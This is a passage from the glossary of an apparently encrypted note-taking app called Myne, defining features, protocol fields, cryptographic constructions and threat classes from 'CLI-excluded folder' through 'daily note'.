A folder the user has excluded from [CLI terminal access](#cli-terminal-access): notes inside it (and its subfolders) are absent from `myne list` and `myne search` results with no trace — no count, no title, no snippet — and refused as write destinations. Backed by the additive `cli_excluded_folders` field in the encrypted `vault.prefs` (`MYP1`), `Shared(SetUnion)` classification (the `ai_excluded_folders`/`deliberate_folders` precedent: NFC-normalized, sorted, deduped folder paths, subfolder containment; an exclusion set on one device must never be lost in a Phase 2 sync merge). Enforced at a single central point on the desktop side of the socket, **after decrypt** (a note's folder lives in its encrypted frontmatter, so the check cannot run any earlier) — not a new leak, since the desktop already holds the plaintext and simply declines to hand it to the CLI, but it means the `vault.search` index (`MYS1`) is itself not scope-aware and results are filtered by folder on the way out. `myne search` specifically treats an excluded match as an oracle risk (a result count that varies with the query would let a caller infer an excluded folder's subject matter without reading a note) and so omits it as completely as a genuine no-match. Contrast [AI-excluded folder](#ai-excluded-folder) (same encoding discipline, different consumer). See `threat-model.md` §7, `decisions.md` 2026-07-29.

### **CLI terminal access** &nbsp; 📦 *Product*

*(Alias: the terminal-access door, CLI thin client.)*

Phase 1 of the `myne` CLI epic (MYND-490, `agent-tooling` epic `myne-cli` ledger CLI-18): a `myne` binary shipped as a Tauri `externalBin` sidecar inside the desktop bundle, registered on the user's PATH, that never opens the vault itself. It connects over a local socket (a Unix domain socket on macOS/Linux, a named pipe on Windows) to the already-running, already-unlocked desktop process and asks it to read/write vault content on its behalf — no key, no password prompt, ever. Gated on two conditions simultaneously: the `cli_enabled` preference (default off, `DeviceLocal`, the `ai_enabled` precedent) and the vault's unlock state — the socket exists only while both hold, so auto-lock closes the door with no CLI-specific logic and no risk of falling out of sync with it. Its Settings block sits behind [Developer mode](#developer-mode) (myne-md/myne#181): opening a running vault to an external process is the clearest case of the membership rule, so the control is not in the default surface. That gate is **visibility only** — hiding it never closes an open socket, which `cli_enabled` alone does. Reach is further narrowed by [CLI-excluded folder](#cli-excluded-folder). Deliberately carries **no identity-checking gatekeeper**: a paired token, a peer-PID check, or a code-signature check would each be defeated by construction by any program already running as the same OS user (confused deputy), so none is built — the residual (any same-user program can drive the door while it is open) is stated rather than hidden. See `threat-model.md` §7, `decisions.md` 2026-07-29. Phase 2 (MYND-491..495, out of scope for Phase 1) adds a standalone `CoreBackend` that opens the vault directly when the desktop isn't running.

### **clip** &nbsp; 📦 *Product*

A captured web article or selection written into the vault as an ordinary [`.myn`](#myn-file) note by the [browser clipper](#browser-clipper). Authored content emitted as canonical [D1](#myne-markdown-dialect-d1) by the [clip serializer](#clip-serializer); images imported as [`MYA1`](#mya1) attachments; saved to the vault root.

### **clip serializer** &nbsp; 🛠️ *Tooling*

*(Alias: D1 clip serializer.)*

The desktop-side `@lezer/markdown`-tree → canonical-D1 emitter that normalizes a clip's Defuddle-produced markdown to Myne's exact dialect — the **first markdown serializer in the codebase** (the dialect layer was previously parse-and-project only). Faithful tables / code / math with safe-degrade (never emits broken markdown).

Used in: MYND-444

### **code-signed releases** &nbsp; 🛠️ *Tooling*

**Retired as a description of Myne, and kept as the term it is not.** This entry said Myne's desktop installers and auto-update payloads were signed with hardware-backed keys and that auto-update refused any artifact failing the check. Every clause is false: no Apple Developer ID and no Windows Authenticode certificate exists, so the `.dmg`, `.deb`, `.AppImage` and `.pkg.tar.zst` carry no signature any OS checks, and, until 2026-10-07, there was no in-app auto-update to verify anything: a signature-gated auto-update now ships (`decisions/clients/0649`), though the installers still carry no OS-checked signature (`threat-model.md` TB7 and A9; this definition was missed by the 0496/0534 sweep and reconciled here). What Myne actually has is **signed release hashes**: each release's `SHA256SUMS` is signed with an offline **minisign** key and cross-published on a second origin, and the user verifies it by hand. The signature authenticates the hash list, not the installer, and no operating system checks it. The Android `.apk` is the one artifact carrying an OS-checked signature, because Android refuses to install an unsigned package.

Used in: `threat-model.md` TB7, §4 A9, §6

### **CodeMirror 6** &nbsp; 🛠️ *Tooling*

The code-editor framework used as the markdown editor in Myne's Phase 1 desktop client. Provides syntax highlighting, live preview, and the foundation for `[[wikilink]]` parsing. Same library that Obsidian uses internally.

Used in: `vision.md` Phase 1 Scope

### **color group** &nbsp; 📦 *Product*

An ordered rule pairing a [filter AST](#filter-ast) with a palette color, applied to [graph view](#graph-view) nodes **at paint time**, the notes a rule matches render in its color; a note matching no rule keeps the neutral node color. Rules are evaluated **first-match-wins in list order**, so array position *is* precedence; a disabled rule stays in the list and contributes no match. Persisted as the `color_groups` field of [`vault.prefs`](#vaultprefs), a nested array of `{id, name, color, enabled, filter}` objects encoded in caller order verbatim (never sorted, unlike `saved_views`), omitted when empty so a vault that never opens the feature stays byte-identical to a pre-feature blob (`spec/protocol.md` §9.5.2). Phase 2 sync classification is **shared, whole-value LWW**, a per-key or set-union merge would silently corrupt precedence. `color` is a design-token palette key, not a hex value, so group colors follow theme, dark mode and a [custom theme](#custom-theme)'s override like every other token; an unresolvable key degrades to neutral. v1 exposes only the `hasTag` and `inFolder` leaves through the authoring UI while persisting the full AST, so widening later is UI-only; an unsupported leaf degrades to no-match rather than throwing, so a rule authored by a newer client never breaks an older one's render. **Non-load-bearing** (cosmetic, AS3-Sensitive content inside the AEAD blob), a tampered or replayed `vault.prefs` can at worst reset or stale the rule set. Color is a render-time layer only: a colour change repaints and never re-runs the graph layout. The one exception is a rule change that ADDS, REMOVES or DISABLES a bare-`hasTag` rule, because such a rule claims a [tag node](#tag-node) and tag nodes are part of the model the layout arranges (`decisions/ui/0602`); that rebuild is warm-started from the positions on screen and does not move the camera. Distinct from a [color label](#color-label), which colors a *sidebar row* and is keyed per note/folder rather than by a filter. (MYND-604)

Used in: `spec/protocol.md` §9.5.2

### **color label** &nbsp; 📦 *Product*

A user-assigned color on a sidebar note or [folder](#folder) row, rendered as a small dot (the title text stays in the ink ramp; a colored left-border is banned by `PRODUCT.md`). Persisted as the `item_colors` field of [`vault.prefs`](#vaultprefs) — an optional nested-object map from a note UUID **or** canonical trailing-slash folder path (discriminated by the trailing `/`, like [item order](#item-order)) to a [label slot](#label-slot) name; NFC-normalized, lexicographically-keyed, omitted-when-empty (`spec/protocol.md` §9.5.2). Note-keyed entries survive note rename/move (the UUID is the filename); folder-keyed entries are prefix-rewritten on folder rename/move and pruned on delete; a stale entry is ignored at render and pruned on the next write. **Non-load-bearing** (cosmetic, AS-low) — a tampered/replayed blob can at worst surface the wrong color. Notes **and** folders both take a color (contrast [custom folder icon](#custom-folder-icon), folders only). See also [label slot](#label-slot), [PrefsView](#prefsview); contrast [color group](#color-group), which colors *graph* nodes by filter rather than a row by key. (MYND-184)

Used in: `spec/protocol.md` §9.5.2; `decisions.md` 2026-06-07

### **comment (markdown)** &nbsp; 📦 *Product* *(Myne-divergent: yes — unterminated `%%` is inert, unlike Obsidian)*

An editor-only note-to-self in note body text, written `%%text%%` inline or `%%`…`%%` as a block / multi-line span (`spec/markdown-dialect.md` §3.1 / §3.2, MYND-315). The comment is **recognize-and-render-only**: it is rendered **dimmed** in the editor (a de-emphasis [decoration](#cursor-aware-reveal) mutes the span — it stays VISIBLE as a comment, never hidden; "hidden in render" means hidden in the output/export, not the editor) and is **stripped from lossy projections** — HTML, PDF, stripped-TXT, and document statistics — via the single §6 sanctioned export transform (one shared recognize-strip pass over the parsed `DialectComment` / `DialectCommentBlock` nodes). The source `%%` bytes are **never rewritten** (§6 C1), so the byte-verbatim `.md` export keeps them: a comment is author content that survives a walk-away. **Termination is required** — a `%%` with no closing `%%` is **inert** (stays literal text, hides nothing), a deliberate divergence from Obsidian's unterminated-`%%`-swallows-to-EOF behavior, chosen to avoid a "half my note vanished" surprise. No authoring affordance produces a `%%` (render-only, like sub/sup). Distinct from an HTML `<!-- -->` comment (a separate construct).

Used in: `spec/markdown-dialect.md` §3.1, §3.2, §3.7.5, §6, §8; `decisions.md` 2026-06-17

### **command palette** &nbsp; 📦 *Product*

Global keyboard-first action launcher in the Phase 1 desktop client, opened via `Cmd+K` / `Ctrl+K`. Renders a centered modal with a fuzzy-match input + scrollable action list; ArrowUp/Down navigates, Enter runs the highlighted action, Esc dismisses. v1 ships five actions across Vault / App / Navigation / Editor categories: Lock vault, Open settings, Switch to note (transitions into a note-picker sub-palette), Import Obsidian vault (disabled stub for Phase 1.x), Convert wikilinks in this note (disabled stub for `editor-mvp-wikilinks`). Action visibility respects the current `Stage` — non-editor stages hide editor-only actions; the palette never exposes actions unavailable in the current state. The action registry is a frozen `readonly CommandAction[]`; no plugin / scripting API is introduced (acceptance criterion enforced structurally). Distinct from the editor's **slash command** menu, which is editor-internal (cursor-anchored) and bound to insertable markdown elements.

Used in: `agent-tooling/features/editor-mvp-baseline/prd.md` (T7), `src/commands/`

### **compelled lawful access** &nbsp; ⚠️ *Threat*

Adversary class A2: subpoena, court order, national security letter, or other legal compulsion forcing the operator to disclose user data. Myne's strong guarantee against A2 is architectural — the server cannot disclose what it does not possess. The disclosure-forced set is limited to ciphertext blobs, hashed account numbers, transient connection IPs, version counters, and aggregate storage size.

Used in: `threat-model.md` §1 (A2)

### **content-scaled field** &nbsp; 📋 *Protocol*

A stored field whose size grows with how much the user has MADE, rather than with how many features the software has. `deliberate_folders` is the first one in `vault.prefs`: one more folder is one more entry, and the user does not think of a folder as a setting.

Its opposite is a **feature-scaled** field, where one more preference is one more key, so the plaintext grows only when the software does and a cap chosen once stays generous indefinitely. `vault.prefs` was sized on that assumption, and the two kinds sharing one fixed cap is what makes the [set-field byte budget](#set-field-byte-budget) necessary: an over-cap save FAILS rather than truncating, so an unbounded content-scaled field can leave a vault unable to save any preference at all.

The distinction is worth naming because the next such field will be added by somebody who is not thinking about the cap. `spec/protocol.md` §9.5.4 exists to be the thing it is checked against.

Used in: `spec/protocol.md` §9.5.4; myne-md/myne#613

### **conflict copy** &nbsp; 📋 *Protocol*

The artifact of [keep-both conflict resolution](#keep-both-conflict-resolution): when the sync engine detects a concurrent edit, it materializes the remote revision as a **new** `.myn` note carrying the Myne-managed `conflict: true` + `conflict_of: <original note_uuid>` frontmatter fields (`spec/markdown-dialect.md` §3.6.1) so both edits survive. A conflict copy is excluded from the live sidebar, folder-tree, full-text search, and the backlink resolver — surfaced only in the **Conflicts view**, reached via a count badge — until the user resolves it ("Keep as separate" clears the markers so it re-enters the live set; "Discard" deletes it). TS orchestrator (`src/notes/conflictCopy.ts`) over `note_create` + `patchFrontmatterField`; no backend command, no `.myn` envelope change (MYND-427). Phase 2.

**`MY01`-only.** Keep-both — and therefore the conflict copy and its Conflicts view — is the **v0.1 (`MY01`) note model**. A next-major CRDT note (`NC05`, `protocol.md` §10.7) never produces a conflict copy: a concurrent multi-device edit of a **live** note is reconciled by an automatic CRDT interleave-merge, surfaced only as a calm "updated from another device" hint (ASM-6→B, `decisions.md` 2026-08-10, #422). A concurrent **delete-vs-edit** is not merged at all — the tombstone wins outright (**remove-wins**, `spec/sync-protocol.md` §11.1, `decisions.md` 2026-08-11, #431) and the note stays deleted with no hint, because "updated from another device" is the wrong sentence for a note that just disappeared. Either way the Conflicts view is empty by construction in a fully-migrated vault.

### **content_type** &nbsp; 📋 *Protocol*

A length-prefixed UTF-8 string carried in the AAD of content-encryption AEAD operations. In v0.1 it is always `"text/markdown"`; the field exists so a later version can introduce attachments (with content types like `"image/png"` or `"application/pdf"`) without breaking the AAD layout.

Used in: `spec/protocol.md` §5.2

### **contentless poke** &nbsp; 📋 *Protocol*

The Phase 2 sync change-notification signal: a **zero-payload** "vault changed, come pull" message carrying **no note-id, no version, no count, no cursor** — anything beyond mere arrival would leak which/what/how-much changed to the untrusted server or a network observer (A13). Polling is the **privacy-default baseline** (a device appears online only at poll time); the poke (over SSE) is an **opt-in low-latency** layer. Presence + timing of a poke is intrinsic A13 (a push already reveals it) and accepted; no payload is added on top. See [sync cursor](#sync-cursor). Phase 2.

Used in: `spec/sync-protocol.md` §8

### **context string** &nbsp; 📋 *Protocol*

A canonical UTF-8 string passed as the `info` parameter to HKDF-Expand to domain-separate one subkey from another. Myne context strings are drawn from a registered table (§3.4) and follow the format `"myne.v0.1 " || role`. The `derive_key` pattern (§3.2.1) is the only sanctioned way to construct and use them.

Used in: `spec/protocol.md` §3.2, §3.4

### **context string registry** &nbsp; 📋 *Protocol*

The table in `spec/protocol.md` §3.4 listing every authorized context string and its role for v0.1. Adding a new role in a minor revision means adding a row to the registry, not bumping the protocol version. Registered roles in v0.1: `itemsKey-wrap`, `prefs-key`, `search-index-key`, `attachments-catalog-key`, `attachments-id-hmac` (active), plus `server-auth`, `backup-key`, and `vault-head-mac` (all reserved — derived material unused in v0.1; `backup-key` demoted 2026-06-10; `vault-head-mac` is the Phase 2 [vault head](#vault-head) MAC key, MYND-416). The next major version defines its own HKDF context-string prefix (not pre-allocated).

Used in: `spec/protocol.md` §3.4

### **core tier / standard tier (manual test roster)** &nbsp; 🛠️ *Tooling*

The two severities a [manual test roster](#manual-test-roster) item may carry. **core** is exactly three things and nothing else: failing means **data loss**, failing means a **security or privacy boundary broke** (plaintext leaving the device, a locked vault still readable, a phrase or key on screen or in a log, an egress with no user consent), or the item verifies the **upgrade over a real vault** from the previous release. Everything else is **standard**. The tier is not a priority label: together with the client it decides whether a row blocks a release today, because `gatedTiers` in `scripts/manual-test-ratchet.json` names the tier or tiers that stop a tag. Widening the gate has exactly two moves, adding a client and adding the other tier, which is why that field is a list rather than a string.

Used in: `scripts/manual-test-roster.mjs`, `scripts/manual-test-ratchet.json`, `docs/dev/manual-test-roster.md`, `decisions.md` 2026-08-21 (manual test roster, myne-md/myne#548)

### **cover (note)** &nbsp; 📦 *Product*

The image a note displays across the top of the editor, above its title. Stored as the thirteenth Myne-managed canonical frontmatter field, `cover:` (`spec/markdown-dialect.md` §3.6.1), whose value is a **value-strict** form-C [attachment](#attachment) embed: the whole logical value must be exactly one `![[att:<id>|<filename>]]` and nothing else, so a user's own `cover: true` or `cover: photo.png` leaves the note uncovered rather than rendering something broken. Strictness is on the **grammar of the value, not on whether the attachment still resolves** — a deleted referent draws no banner at all (no tombstone, unlike a form-C embed in the body), and a not-yet-loaded catalog reserves the banner's height instead of shifting the text. Written only by the cover set / change / remove actions (`src/notes/setNoteCover.ts`) over the **generic** `patchFrontmatterField`, like the conflict pair; body autosave never touches it. A cover is always a vault attachment: Myne never fetches a remote image, so a URL is not a cover. **Note-level, not per-view** — the saved-view `image` setting still names whichever property a view points at and still reads it leniently, which is why a hand-written value the strict grammar rejects may nonetheless render on a card. Deliberately **not** shown on list surfaces: the sidebar note tree, tabs, search results and the quick picker stay text-first (myne-md/myne#410). See [attachment](#attachment), [saved view](#saved-view).

Used in: `spec/markdown-dialect.md` §3.6.1; `decisions.md` 2026-08-15 "Note cover is a note-level canonical field, and list surfaces stay text-first".

### **CRDT (Conflict-free Replicated Data Type)** &nbsp; 🏗️ *Construction*

A class of data structures that allow concurrent edits across multiple replicas to be merged without coordination. Myne uses [Automerge](#automerge) (a Rust CRDT library) as its CRDT — for the next-major note-body CRDT note-type (`automerge-sync-migration`, `decisions.md` 2026-08-09) and, later, Phase-4 real-time collaborative editing. CRDTs are not in v0.1.

Used in: `vision.md` (Phase 4 scope); `decisions.md` 2026-08-09

### **credential phishing** &nbsp; ⚠️ *Threat*

*(Aliases: phrase phishing, lookalike origin. Myne-divergent: no, but what makes it reachable here is Myne-specific.)*

Adversary class A18: an origin the user mistakes for Myne's asks them for their 24-word recovery phrase and account number, which together yield `root_key` and therefore the whole vault, permanently and with no in-app remedy (`spec/protocol.md` §7). It needs no bundle compromise, so it is neither [A15](#hostile-code-delivery) nor A4, and no delivery-channel control touches it.

The reason it is a **new** row rather than an always-present one is the part worth remembering: until 2026-08-15 the web client never generated, displayed or accepted a phrase (`decisions.md` 2026-07-26), so "a web page is asking me for my 24 words" was itself proof of an attack, with no judgement required of the user. Shipping web creation and web recovery (`decisions.md` 2026-08-15, entry 0514) spends that inference. What replaces it is narrower and weaker: the phrase is asked for on the web client in exactly one situation, a recovery the user started themselves, which is why phrase-credential *device enrolment* stays a decided absence there.

Used in: `threat-model.md` §1 (A18), §5

### **Crockford base32** &nbsp; 🏗️ *Construction*

The 32-character alphanumeric base-32 encoding defined by Douglas Crockford, excluding the visually ambiguous `I L O U`. Myne encodes account-number entropy as 19 Crockford characters (95 bits) plus 1 Damm-32 check character (`spec/account-number.md` §2).

Used in: `spec/account-number.md` §2
Reference: https://www.crockford.com/base32.html

### **cryptographic erase** &nbsp; 🏗️ *Construction*

Per NIST SP 800-88 Rev. 1: securely deleting data by destroying the key under which it was encrypted, rendering the ciphertext unrecoverable even if it persists physically (e.g., on SSD wear-leveled cells, in cloud backups). Myne's three-level note-key wrapping (§3.3) makes per-note cryptographic erase a primitive: deleting a note's `item_key` entry from the wrapped storage renders that note's ciphertext unrecoverable.

Used in: `spec/protocol.md` §3.3 (implicit)

### **cross-origin isolation** &nbsp; 📦 *Product*

The browser state a page enters when it serves `Cross-Origin-Opener-Policy: same-origin` **and** `Cross-Origin-Embedder-Policy: require-corp`, gating `SharedArrayBuffer`, high-resolution timers, and wasm threading. The Phase 3 web client needs it, and the price it charges — **no third-party origins at all** — is a cost the security posture already committed to, so it is free here rather than a trade. Confirmed in the Phase 0 spike: all three browsers reported `crossOriginIsolated: true` with `SharedArrayBuffer` available. Threads are therefore *possible* and *not needed* — single-threaded Argon2id at `p=2` already derives in under 700 ms.

Used in: `decisions.md` 2026-07-26 (dedicated app origin); `threat-model.md` §1 A15

### **capability descriptor** &nbsp; 📦 *Product*

The single value the UI consults to decide whether a platform provides a given affordance, so gating is one decision rather than a condition re-derived at each call site. Its rule is **omission, not disablement**: a capability the running platform lacks is **absent from the interface**, never shown greyed out — a disabled control is a promise the platform cannot keep. It is asserted in tests, so adding a desktop-only command without gating it fails CI rather than shipping a broken web affordance. Distinct from the **web capability set**, which is the *normative* statement of what web may do; the descriptor is the runtime projection of it.

Used in: `decisions.md` 2026-07-26 (web capability set)

### **capability gating** &nbsp; 📦 *Product*

The act of applying the [capability descriptor](#capability-descriptor) — the web client omitting from its interface everything the [web capability set](#web-capability-set) says a browser may not do. Named as a term because it is what the web E2E lane tests by that name (`e2e-web/capability-gating.e2e.ts`), and what it asserts is the **absent, not disabled** rule rather than the presence of an error message. Gating is stated twice on purpose — `web/src/platform/capabilities.ts` decides what the UI omits, `web/wasm/src/capability.rs` decides what the dispatcher refuses — and the two are kept from disagreeing by `scripts/check-web-capabilities.mjs`, because "UI offers, backend refuses" reproduces the greyed-control failure by a different route and "UI omits, backend allows" hides a working feature with nothing reporting it.

Used in: `decisions.md` 2026-07-26 (web E2E policy); `docs/dev/e2e.md`

### **CTX commitment** &nbsp; 🏗️ *Construction* (deep entry)

The key-committing AEAD construction defined by Chan & Rogaway (ESORICS 2022) that wraps a non-committing AEAD to provide commitment to the key. Myne instantiates CTX with XChaCha20-Poly1305 as the inner AEAD and SHA-256 as the outer hash. The Poly1305 tag T (16 bytes) is replaced on disk by the 32-byte commitment tag T' = SHA-256(canonical_encode(K, N, AD, T)), where `canonical_encode` uses a length-prefixed encoding of AD to eliminate concatenation ambiguity per Chan & Rogaway §3. This defends against partitioning-oracle attacks (Len–Grubbs–Ristenpart, USENIX 2021): without CTX, an attacker with a partial-decrypt oracle could construct a ciphertext that decrypts under multiple keys, enabling binary-search brute-force against weak passwords. The cost is ~30 lines of code, ~0.001% performance, and ~16 extra bytes per AEAD operation on disk.

Used in: `spec/protocol.md` §5.1
Reference: Chan & Rogaway, "On Committing Authenticated Encryption", ESORICS 2022.

### **cursor-aware reveal** &nbsp; 📦 *Product*

The Phase 1 editor pattern where decorations on the line containing the cursor lift to expose the underlying markdown source for editing, then reapply when the cursor leaves the line. There is no separate "rendered view" / "source view" mode-switch: cursor location *is* the reveal. Headings show their leading `#`s on the active line and hide them off-line; bold and italic delimiters reveal on entry; inline link URLs become editable when the cursor enters their parent line. Wikilink chips are a NARROWER case per `spec/wikilink.md` §5.4 (myne-md/myne#659): a chip lifts for the caret that is at its start or inside it, and only that one, so a caret elsewhere on the line leaves every chip on it rendered. **Task-field chips are a second exception** (MYND-614): they never open on caret entry. A date is a structured value, not prose, and a line carrying three chips would reflow every time the caret travelled it: but they *do* open while the find panel is open, because a search that lands on a match inside hidden text and highlights nothing is worse than not finding it. Reading mode never reveals, under either exception.

**The task checkbox has a third trigger: a SELECTION that overlaps it** (myne-md/myne#560). It lifts when a selection merely overlaps the hidden `- [ ]` run, not only when a caret is inside it, and its trigger is per-range rather than per-line. Stated for that construct rather than as a class rule about widget-replacing decorations, because it is not one: `revealsRange` has a single caller in the tree, and the two exceptions above go the other way. Wikilink chips lift under a selection that overlaps them, on the same per-range rule (`spec/wikilink.md` §5.4, myne-md/myne#659; the shared body is `revealsWith` in `editor/src/decorations/cursor-aware.ts`, and the two predicates differ only in whether the range's END counts). Task-field chips still open only for the find panel. The reason is not editing but painting: the rendered checkbox has an opaque accent fill, and a translucent selection band across it, beside the same band over plain text, is two tones in one selection. Showing the source removes the opaque surface rather than working around it, and it is the honest answer: what is selected is the markup, so the markup is what belongs on screen and on the clipboard. Restyling decorations (emphasis, link, inline code) keep the older per-endpoint rule: a mark changing style under a selection is harmless where a widget vanishing is not.

Used in: `spec/markdown-dialect.md`, `agent-tooling/features/editor-mvp/rfc.md`; `decisions.md` 2026-07-28, 2026-08-25 (entry 0536)

### **custom folder icon** &nbsp; 📦 *Product*

A user-chosen icon replacing a [folder](#folder)'s default sidebar glyph, rendered in `currentColor` (icons are never colored independently, `PRODUCT.md`). Persisted as the `folder_icons` field of [`vault.prefs`](#vaultprefs) — an optional nested-object map from a canonical trailing-slash folder path to an icon name drawn from a curated client-side stroke-glyph set (no arbitrary/uploaded icon, no emoji); NFC-normalized, lexicographically-keyed, omitted-when-empty (`spec/protocol.md` §9.5.2). Folder-keyed entries are prefix-rewritten on folder rename/move and pruned on delete; a stale or unknown-icon entry is ignored at render and pruned on the next write. **Non-load-bearing** (cosmetic, AS-low). Folders only — notes get a [color label](#color-label) but not a custom icon. See also [color label](#color-label), [PrefsView](#prefsview). (MYND-185)

Used in: `spec/protocol.md` §9.5.2; `decisions.md` 2026-06-07

### **custom theme** &nbsp; 📦 *Product*

A user-authored color palette — distinct from the built-in Light/Dark [Theme preference](#theme-preference). A flat map of CSS custom-property names to values (`{ "--paper": "#…", "--ink-1": "#…", … }`): a **single flat palette** that, when selected, *overrides* Light / Dark / System rather than carrying per-mode variants. It is validated host-side (Rust) — the minimal raw-ramp token core must be present, and every value must match a **value-shape allowlist** (hex / `rgb()` / `rgba()` / `hsl()` / named color / `<number><unit>`), the *primary* injection guard because the WebView keeps `style-src 'unsafe-inline'` (`threat-model.md` custom-theme CSS-value surface; `decisions.md` 2026-06-16). **The palette is vault content**: it lives in the encrypted [`vault.themes`](#vaultthemes) blob (`MYT1`, `spec/protocol.md` §9.21) — encrypted at rest, synced, and backed up — while the *selection* `custom:<name>` persists in the encrypted [`vault.prefs`](#prefsview) `custom_theme` field (the blob holds the palettes, prefs holds the pointer). This **supersedes** the original device-local plaintext `app_config_dir/themes/<name>.json` storage (`decisions.md` 2026-07-16); palettes now enter and leave only by explicit user import/export of a `.json`. A custom theme is **validated, not sandboxed**: it is not a security boundary, only a guarded cosmetic surface. Introduced MYND-111 (custom-themes epic); promoted to vault content MYND-486. See also [Theme preference](#theme-preference), [vault.themes](#vaultthemes), [syntax color tokens](#syntax-color-tokens).

### **Cytoscape.js** &nbsp; 🛠️ *Tooling*

Originally selected for Myne's minimal graph view, but **superseded 2026-06-08 by [d3-force](#d3-force) + a hand-rolled canvas renderer** (see `decisions.md` 2026-06-08). The leaner decomposition — a dep only for the force-simulation, with render/interaction hand-rolled — cleared `dependency-policy.md` "The bar" Q1 where the full framework did not. Retained here for historical reference.

### **d3-force** &nbsp; 🛠️ *Tooling*

The force-directed-layout simulation library (`d3-force`, ISC) used for Myne's minimal graph view in Phase 1. It computes node positions only; the canvas render, pan/zoom/hit-test, and interaction are hand-rolled (no graph framework). Lazy-loaded into a separate panel rather than rendered in the editor surface. Chosen over [Cytoscape.js](#cytoscapejs) per `decisions.md` 2026-06-08 — the Envelope-A scale target (smooth to low-thousands of nodes, controlled degradation above) shrinks the dependency question to "force-simulation only", which `dependency-policy.md` Q1 then resolves to the hand-roll-plus-leaf-dep form.

### **decoration layer** &nbsp; 📦 *Product*

The CodeMirror 6 render overlay that hides or replaces ranges of the markdown buffer visually without mutating the underlying text. Decorations come in four kinds: `mark` (apply a CSS class to a range — used to hide leading `#`s), `widget` (insert a DOM element at a position — used for wikilink chips, task list checkboxes), `replace` (hide a range and substitute a widget — used for table widgets and code-block frames), and `line` (per-line attributes on the wrapping `cm-line` div — used for blockquote left-border styling). The decoration layer reads the `@lezer/markdown` AST and produces decorations per node type. The text buffer is canonical; decorations are ephemeral state derived from the buffer plus cursor position.

Used in: `vision.md` Phase 1 Scope

### **definition list** &nbsp; 📦 *Product*

A Pandoc-style block construct: a *term* line immediately followed by one or more *definition* lines, each introduced by a leading `:` marker (`Term` ⏎ `: Definition`). Myne v0.1 recognizes and renders a **pinned tight subset** — term immediately followed (no blank line) by `:`-prefixed definition line(s), multiple definitions allowed; the loose/blank-line-separated form, lazy continuation, and multiple-terms-per-block are excluded and preserved byte-stably as ordinary paragraphs. The GFM grammar has no definition-list node, so a custom `MarkdownConfig` block parser produces a `DefinitionList` node (`DefinitionTerm` / `DefinitionMarker` / `DefinitionDesc` children); the editor renders the term styled with the definitions indented and the leading `:` hidden off-cursor. Recognized and rendered but **never emitted** — no authoring affordance produces one. Moved into v0.1 scope by a 2026-05-30 scope reversal (previously out of scope per the D1 dialect entry). See also [decoration layer](#decoration-layer), [reference link](#reference-link).

Used in: `spec/markdown-dialect.md` §3.1, §8; `decisions.md` 2026-05-30

### **Declared payload** &nbsp; 🛠️ *Tooling*

*(Aliases: none. Myne-divergent: yes — this is Myne's own measure, not a packaging-format term.)*

The byte total of everything the desktop bundle configuration *declares* it will carry: every path under `bundle.resources` in `src-tauri/tauri.conf.json`, plus `bundle.externalBin` and the release binary when a build has produced them. It is **not** the size of a DMG, an AppImage or a `.deb` — those are compressed and carry installer chrome — and it exists because CI never builds one: `tauri-compile` runs `pnpm tauri build --no-bundle`, so there is no artifact on the runner to weigh. The declared payload is the measurable-in-CI proxy, and a good one because model weights are incompressible, so a change there moves the download roughly 1:1. Measured byte-exact from `stat`, never with `du`, whose per-file KiB rounding varies by filesystem and inflated the same tree by 9.4 MiB.

Used in: `scripts/check-desktop-payload-budget.mjs`, `src-tauri/payload-baseline.json`

---

### **DecryptedNote** &nbsp; 📦 *Product*

The opaque Rust handle returned by `protocol::decode_note` on a successful per-note decryption (`spec/protocol.md` §6.4). Carries — privately — the original 112-byte header slab from the source `.myn` blob (bytes 0..47+N: magic + version + reserved + items_key_id + item_key_nonce + enc_item_key_len + enc_item_key), the unwrapped 32-byte `item_key` in `Zeroizing<[u8; 32]>`, the decrypted markdown plaintext in `Zeroizing<Vec<u8>>`, and the `note_uuid` carried out-of-band per §9.1 (the `.myn` filename, not in the blob bytes). All four fields are private; consumers reach the non-secret subsets through accessor methods that slice into the slab. The slab retention is load-bearing for §6.3's "bytes 0..47+N byte-identical across revisions" invariant: `encode_update` splices the slab verbatim into the new blob, never reconstructs the prefix from fields. `Drop` zeroizes both `item_key` and `plaintext`; the `Debug` impl is hand-written and emits redacted markers (a regression test pins the no-leak property). `encode_update` consumes the handle by value (typestate "one decode, one update"); `encode_update_blob_raw` borrows for D6-style nonce-permutation tests.

Used in: `spec/protocol.md` §6, `decisions.md` 2026-05-05 "`item_key` persistence across note revisions"

### **Damm-32 / Damm algorithm** &nbsp; 🏗️ *Construction*

A check-digit algorithm using a **weak** totally anti-symmetric quasigroup with zero diagonal (Damm 2004), generalized here to a 32-character alphabet matching Crockford base32. Myne appends one Damm-32 character to the 19-character account-number payload to catch single-character substitutions, all adjacent transpositions, and a high fraction of two-character errors. The 32×32 quasigroup table is frozen in `spec/account-number.md` §4.2 — derived over GF(2⁵) (x⁵+x²+1, bitmask 37) and pinned both as a literal table and a `myne-test-vectors` `damm32-table` vector. The operation is commutative (hence weak — not fully — anti-symmetric), which is correct: the Damm check equation requires only weak total anti-symmetry. Changing the table is a major-version event.

Used in: `spec/account-number.md` §4

### **daily note** &nbsp; 📦 *Product*

An ordinary `.myn` note representing one calendar day, identified by **folder + date-title** (e.g. a note titled `2026-06-07` inside the `Daily/` folder) — **not** a calendar object, date-object model, or date-indexed database. The "Open today's note" command resolves today's note idempotently: it computes today's date-title from `now` via the `daily_date_format` pref and looks for a non-trashed, non-template note matching the daily folder + date-title under case-fold + NFC identity (`spec/markdown-dialect.md` §3.6.2); found → open, not found → create (from the [note template](#note-template) the `daily_template` pref points at, or blank with the date as title) and open. Three `vault.prefs` fields configure it (`spec/protocol.md` §9.5.2): **daily folder** (`daily_folder`, default `Daily/`, also registered as a [deliberate folder](#deliberate-folder) so it survives empty), **daily date format** (`daily_date_format`, default `YYYY-MM-DD`), and **daily template** (`daily_template`, a template UUID or unset). Past days are reached via the ordinary sidebar folder — no date-picker, no jump-to-date. Bounded as a plain-markdown skeleton + date navigation by construction, respecting the anti-Notion / no-calendar commitment (`vision.md`). See [decisions.md](decisions.md) 2026-06-07 (MYND-191).

Since myne-md/myne#177 the daily note is one [periodic note](#periodic-note) among three; its three `daily_*` fields are unchanged and are deliberately NOT migrated into the `periodic_notes` map.

Used in: `spec/protocol.md` §9.5.2; `decisions.md` 2026-06-07 (MYND-182 / MYND-191)

### **default new-note location** &nbsp; 📦 *Product*

